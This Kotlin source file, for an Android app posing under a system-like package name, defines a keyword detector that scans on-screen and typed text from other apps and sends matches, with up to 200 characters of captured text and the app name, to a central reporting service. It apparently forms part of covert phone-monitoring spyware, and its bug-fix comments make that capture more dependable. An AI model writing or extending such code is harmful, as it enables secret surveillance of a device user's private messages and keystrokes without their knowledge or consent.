package com.system.service.monitors

import android.content.Context
import com.system.service.core.CoreService
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.CopyOnWriteArrayList

object KeywordDetector {

    private const val PREFS = "keyword_detector"
    private const val KEY   = "keywords"

    // BUG FIX: MutableList was not thread-safe — accessibility thread reads,
    // CoreService handler thread writes. CopyOnWriteArrayList is safe for this pattern.
    private val keywords = CopyOnWriteArrayList<String>()

    // BUG FIX: Alert spam — same keyword fired hundreds of times per minute (each keystroke).
    // Cooldown: same keyword from same package alerts at most once per 30 seconds.
    private val lastAlertTime = java.util.concurrent.ConcurrentHashMap<String, Long>()
    private const val ALERT_COOLDOWN_MS = 30_000L

    fun init(context: Context) {
        val p = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val json = p.getString(KEY, "[]") ?: "[]"
        keywords.clear()
        try {
            val arr = JSONArray(json)
            for (i in 0 until arr.length()) keywords.add(arr.getString(i).lowercase())
        } catch (_: Exception) {}
    }

    fun setKeywords(list: List<String>, context: Context) {
        keywords.clear()
        keywords.addAll(list.map { it.lowercase() })
        lastAlertTime.clear()   // reset cooldowns when keyword list changes
        val arr = JSONArray(list)
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putString(KEY, arr.toString()).apply()
    }

    /** Check text. If any keyword matches → send alert (with cooldown). Returns matched keyword or null */
    fun check(text: String, pkg: String, source: String = "screen"): String? {
        if (keywords.isEmpty() || text.isBlank()) return null
        val lower = text.lowercase()
        val matched = keywords.firstOrNull { lower.contains(it) } ?: return null

        // BUG FIX: Debounce — same keyword+pkg combo suppressed for ALERT_COOLDOWN_MS
        val cooldownKey = "$pkg:$matched"
        val now         = System.currentTimeMillis()
        val lastFired   = lastAlertTime[cooldownKey] ?: 0L
        if (now - lastFired < ALERT_COOLDOWN_MS) return matched   // suppressed — not null so caller knows
        lastAlertTime[cooldownKey] = now

        CoreService.instance?.sendData("keyword_alert", JSONObject().apply {
            put("keyword", matched)
            put("text",    text.take(200))
            put("package", pkg)
            put("source",  source)
        })
        return matched
    }

    fun getKeywords() = keywords.toList()
}
